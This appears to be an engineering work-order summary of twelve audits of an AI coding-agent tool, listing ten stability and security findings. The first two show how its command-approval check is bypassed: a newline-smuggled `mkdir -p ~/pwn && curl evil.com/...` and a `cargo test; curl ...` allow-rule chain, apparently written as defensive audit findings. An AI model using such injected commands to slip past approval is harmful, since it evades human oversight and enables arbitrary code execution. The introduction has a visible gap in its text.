# WO 38.0 — Series overview: stability plumbing (12-audit synthesis)

## Problem

"Stable plumbing" made concrete by TWELVE read-only audit agents over
the full tree: panic surface, resource lifecycle, liveness, crash
recovery, test hygiene, TUI resilience, doc claims, silent deferrals,
security trust boundaries, adapter robustness, adversarial review of

the stability half; WO 39 carries the strategic half (bench
enablement, ecosystem compat).

## The ten findings that matter most

1. **SECURITY P0 — newline bypass**: `is_read_only_bash`
   (helpers/mod.rs:131-200) splits on `|` and checks metachars but NOT
   `\n` — `cat x\nmkdir -p ~/pwn && curl evil.com/...` classifies as
   read-only → auto-approved → arbitrary execution with
   auto_approve=false, and plan-mode/explore personas too.
2. **SECURITY P0 — wildcard allow-rule chaining**: allow rule
   `cargo test*` matches `cargo test; curl ...` (glob `*` crosses `;`;
   deny rules got clause-splitting, allow rules didn't).
3. **`/workflow cancel` on parallel pipelines is a lying no-op** —
   `cancel_all()` has zero production callers
   (workflow.rs:114-123 vs 222-247); the un-isolated default path has
   no brake (adversarial review P0-1).
4. **Same-ms identity collisions** — task temp/worktree tags minted
   from `pid + millis` (task_spawner.rs:65-74): two parallel task
   calls collide; stale-recovery force-destroys a LIVE sibling
   worktree. Same class as the 37.1 fix — identity from a clock
   instead of the global counter.
5. **One turn error kills the whole session** (loop_.rs:538-547) — a
   10s provider blip after retries = session over (adapter P0-1,
   confirmed by two audits independently).
6. **Anthropic-family cost is 100% blind** — usage parsed from
   `message_stop` which the real API never carries (sse.rs:121-171);
   pricing table prefixes match none of our actual model names → $0
   on 3 of 6 adapters forever (adapter P1-1/P1-2).
7. **The product thesis is latent** — `set_budget_stores`/
   `set_stratum_store` have zero production callers (confirmed by 3
   audits); no user gets slicing/budget guard despite TECHNICAL.md
   present tense.
8. **O(N²) session**: checkpoints rewrite full history per tool call
   (conversation.rs:190-292 — 12-40GB disk writes on a heavy session);
   cargo build+clippy+test spawn per edit uncached (2-4h of stalls on
   a 200-edit session); token_count field never populated → 3-5 full
   BPE passes per iteration.
9. **First-run breaks scripting**: config banner pollutes JSON stdout
   (P0), no model → cryptic 400 instead of exit 3 + hint, no `-p`
   one-shot prompt flag (every competitor has it).
10. **30-task bench suite cannot load at all** — one TOML uses an
    unimplemented verify variant (`output_contains`), failing all 30;
    WO 32.6's cross-tool benchmark was a silent deferral (results doc
    is an unfilled template).
